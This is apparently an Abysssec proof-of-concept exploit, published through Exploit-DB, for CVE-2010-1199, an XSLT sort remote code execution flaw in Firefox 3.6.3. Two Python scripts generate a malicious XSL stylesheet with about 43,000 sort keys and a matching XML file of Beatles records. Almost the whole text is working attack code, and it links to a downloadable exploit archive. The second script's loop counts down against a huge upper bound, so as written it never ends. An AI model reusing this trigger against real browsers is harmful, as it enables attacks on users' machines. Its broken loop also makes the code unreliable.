'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ <  Day 9 (Binary Analysis)
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 
 
 http://www.exploit-db.com/moaub-9-mozilla-firefox-xslt-sort-remote-code-execution-vulnerability/
 https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/14949.zip (moaub-day9-ba.zip)

'''

'''
  Title             : Mozilla Firefox XSLT Sort Remote Code Execution Vulnerability
  Version           : Firefox 3.6.3
  Analysis          : http://www.abysssec.com
  Vendor            : http://www.mozilla.com
  Impact            : High/Critical
  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter           : @abysssec
  CVE               : CVE-2010-1199
'''
import sys;

myStyle = """<?xml version="1.0"?>
<xsl:stylesheet version="1.0" 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html"/>
<xsl:template match="/">
 <html>
  <head>
   <title>Beatles</title>
  </head>
  <body>
   <table border="1">
   <xsl:for-each select="beatles/beatle">
"""

BlockCount = 43000

count = 1
while(count<BlockCount):
    myStyle = myStyle + "<xsl:sort select='name/abysssec"+str(count)+"' order='descending'/>\n"
    count = count + 1

myStyle = myStyle +"""
    <tr>
    <td><a href="{@link}"><xsl:value-of select="name/lastname"/></a></td>
    <td><a href="{@link}"><xsl:value-of select="name/firstname"/></a></td>
    </tr>
   </xsl:for-each>
   </table>
  </body>
 </html>
</xsl:template>

</xsl:stylesheet>
    """
cssFile = open("abysssec.xsl","w")
cssFile.write(myStyle)
cssFile.close()



'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ < 
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

'''

'''
  Title             : Mozilla Firefox XSLT Sort Remote Code Execution Vulnerability
  Version           : Firefox 3.6.3
  Analysis          : http://www.abysssec.com
  Vendor            : http://www.mozilla.com
  Impact            : High/Critical
  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter           : @abysssec
  CVE               : CVE-2010-1199
  MOAUB Number      : MOAU_09_BA
'''
import sys;

myStyle = """<?xml version="1.0"?>
<?xml-stylesheet href="abysssec.xsl" type="text/xsl"?>
<beatles>

"""
block = """
 <beatle link="http://www.johnlennon.com">
  <name>
"""
BlockCount = 2147483647
rowCount=10
#myStyle = myStyle + "<tree id='mytree' flex='1' rows='"+str(rowCount)+"'>\n"
count = 1
while(count<BlockCount):
    myStyle = myStyle + """
	<beatle link="http://www.johnlennon.com">
    <name>
	"""
    myStyle = myStyle + " <firstname>"+"A"*rowCount+"</firstname>\n"
    myStyle = myStyle + """
         <lastname>Lennon</lastname>
      </name>
     </beatle>
     <beatle link="http://www.paulmccartney.com">
      <name>"""

    myStyle = myStyle + " <firstname>"+"B"*rowCount+"</firstname>\n"
    myStyle = myStyle +  """   <lastname>McCartney</lastname>
      </name>
     </beatle>
     <beatle link="http://www.georgeharrison.com">
      <name>
      """
    myStyle = myStyle + " <firstname>"+"C"*rowCount+"</firstname>\n"
    myStyle = myStyle + """
       <lastname>Harrison</lastname>
      </name>
     </beatle>
     <beatle link="http://www.ringostarr.com">
      <name>
      """
    myStyle = myStyle + " <firstname>"+"D"*rowCount+"</firstname>\n"
    myStyle = myStyle + """
       <lastname>Starr</lastname>
      </name>
     </beatle>
     <beatle link="http://www.webucator.com" real="no">
      <name>
      """
    myStyle = myStyle + " <firstname>"+"E"*rowCount+"</firstname>\n"
    myStyle = myStyle +"""
       <lastname>Dunn</lastname>
      </name>
     </beatle>
 
    """
    count = count - 1

myStyle = myStyle +"""
    </beatles>
    """
cssFile = open("abyssssec.xml","w")
cssFile.write(myStyle)
cssFile.close()